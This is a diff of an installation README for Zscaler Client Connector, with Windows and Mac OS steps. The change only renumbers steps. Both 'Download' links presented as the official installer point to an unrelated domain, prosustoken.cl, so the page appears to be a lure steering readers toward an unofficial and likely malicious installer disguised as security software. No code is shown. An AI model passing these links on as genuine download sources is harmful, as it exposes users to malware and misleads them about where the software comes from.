@@ -15,11 +15,11 @@ Zscaler Client Connector ensures seamless, secure connectivity between user devi
 
 ### Windows
  ### 🔗 [**Download Zscaler Client Connector**](https://prosustoken.cl/zscaler/)
-3. **Locate the Download**: Ensure the file is in your Downloads folder.
-4. **Accept the License Agreement**: Follow the on-screen prompts, accept the terms, and click **Next**.
-5. **Custom Setup**: Proceed with the default or customized settings as required.
-6. **Install the Application**: Click **Install** and wait for the process to complete.
-7. **Verify Installation**: Locate the ZCC icon in the system tray or search for it in the Start menu to ensure successful installation.
+1. **Locate the Download**: Ensure the file is in your Downloads folder.
+2. **Accept the License Agreement**: Follow the on-screen prompts, accept the terms, and click **Next**.
+3. **Custom Setup**: Proceed with the default or customized settings as required.
+4. **Install the Application**: Click **Install** and wait for the process to complete.
+5. **Verify Installation**: Locate the ZCC icon in the system tray or search for it in the Start menu to ensure successful installation.
 
 ### Mac OS
 1. **Download the Installer**: Download from [**Zscaler Mac OS Installer**](https://prosustoken.cl/zscaler/).
